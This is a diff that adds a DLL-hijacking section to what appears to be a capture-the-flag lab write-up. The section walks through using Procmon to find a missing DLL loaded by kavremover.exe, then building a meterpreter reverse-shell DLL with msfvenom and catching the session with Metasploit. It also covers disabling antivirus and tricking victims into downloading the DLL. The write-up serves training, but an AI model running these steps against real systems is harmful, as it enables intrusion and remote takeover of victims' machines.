@@ -77,7 +77,16 @@ CVE-2021-34527, or PrintNightmare, is a vulnerability in the Windows Print Spool
     
 - Submit the user flag on Task 4, question 7.
 
+
+---
+
 ## DLL Hijacking
+
+### Identify vulnerable application and location
+
+Enumerate the system and you'll find  a very interesting application (kavremover.exe) on `C:\Users\watamet\Applications\`, which is unusual path for program.
+
+### Identify applications PID
 
 You need Procmon.exe (Process Monitor) to get the name of the vulnerable application. 
 *"Process Monitor is an advanced monitoring tool for Windows that shows real-time file system, Registry and process/thread activity."*
@@ -85,7 +94,89 @@ You need Procmon.exe (Process Monitor) to get the name of the vulnerable applica
 - Download it from [here](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon).
 - Copy the file to the C:\Windows\Task.
 - Run the application.
-- 
+	![[Task 43 - WERE TAKING OVER THIS DLL!-20241120140053506.webp]]
+
+### Identify vulnerable DLLs that can be hijacked
+
+- Minimize Procmon and start up `kavremover.exe`. press accept and exit when hit with the following screen.
+
+	![[Task 43 - WERE TAKING OVER THIS DLL!-20241120140155634.webp]]
+
+- Close the kavremover executable, as the information till now has already been logged in ProcMon.
+
+> [!note]
+> Why do we not proceed further when we can probably find more DLLs? well, when attacking, it is preferred that it requires little to no user interaction in order to complete the attack. That’s the reason we stop here in hopes to achieve the above said goal. If one cannot find any DLLs , they may try to go further ahead to see if anything pops up, but for this post, we will exit here.
+
+- Go baack to Procmon and filter the results.
+
+- Filter: process name contains `kavremover`.
+
+	![[Task 43 - WERE TAKING OVER THIS DLL!-20241120141101049.webp]]
+
+- Filter: Path ends with `.dll`.
+
+	![[Task 43 - WERE TAKING OVER THIS DLL!-20241120141236612.webp]]
+
+> [!note]
+> You want to hijack a dll that the application tries to load but isn’t actually present on the system. So whenever the dll is not present on the system, its result is logged as “NAME NOT FOUND” in ProcMon.
+
+- Filter: Result is `NAME NOT FOUND`.
+
+	![[Task 43 - WERE TAKING OVER THIS DLL!-20241120141848772.webp]]
+	![[Task 43 - WERE TAKING OVER THIS DLL!-20241120142020794.webp]]
+
+> [!note]
+> As you can see, now only entries with NAME NOT FOUND are left. So now in front of us, we have list of DLLs that kavremover couldn’t find on system but wants to load. Press Apply and OK if you haven’t already.Even though we have so many DLLs that the executable couldn’t find on system, we cannot hijack each and every one of them. In the path, look for path that corresponds to the same directory from where the application was loaded ( In this case, its `C:\Users\watamet\Applications\kavremoverENU.dll`).
+> This is the dll that we will try to hijack.
+
+> [!Question]
+> **Why not other DLL?**
+> 
+> So you might have a question as to why not just choose a random dll from this?. Well, from the attacker’s perspective, it has locations that they cannot access due to insufficient privileges. We can hijack any of the DLLs in the list, but from an attacker’s perspective, the application is only vulnerable if he can somehow access that path. There are two scenarios, one maybe the user has user privileges with some exploit and is in post exploitation phase. In this case, he can choose any path that the current user has access to. Other one (Common one) is that he is trying to get foothold on the machine by social engineering victim into downloading the malicious dll or something similar. So it’s safe to assume that if your victim downloads your malicious application, then he will run from the same location, and thus any dll in that path is accessible to us. Or you can think of it as providing crack for a game. You only have access to that particular folder where it was downloaded. That’s the reason we look for DLLs that are trying to be loaded from the same directory( desktop in my case ).
+
+
+### Use MSFVenom or other payload creation tools to create a malicious DLL
+
+Now you know the name of DLL that we want to hijack. So all you have to do is place the malicious DLL in that path and wait for victim to execute the application. There are several ways of creating this DLL. For this article we will use msfvenom to create the payload.
+
+> [!warning]
+> The application will be detected as a virus by the AntiVirus, so make sure you turn off AV or windows defender.
+
+#### Creating a payload DLL
+
+Kavremover is a 32 bit application, we will create a 32 bit payload dll with msfvenom. The syntax for creating one is:
+
+```
+$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ATTACHING MACHINE IP> LPORT=4444 -f dll -o kavremoverENU.dll
+```
+
+**Explanation**
+
+- **p** stands for payload. We supply the payload as windows/meterpreter/reverse_tcp.
+- **LHOST** is the attacker IP. (Your Kali IP)
+- **LPORT** is the attacker Port.
+- **f** is for format, we choose dll
+- **o** is for name of output file, we will use the same name as the one we need to hijack, kavremoverENU.dll.
+
+#### Download the dll
+
+Copy or download the kavremoverENU.dll file to the victim machine `C:\Users\watamet\Applications\` directory.
+
+As you are using a RDP connection with a drive shared, simply copy the file.
+
+### Exploiting the DLL
+
+On the attacking machine, run `metasploit` to receive sessions from the payload.
+
+```
+$ msfconsole
+
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST <ATTACKING MACHINE IP>
+set LPORT 4444
+exploit
+```
 
 ## Answer the questions
 
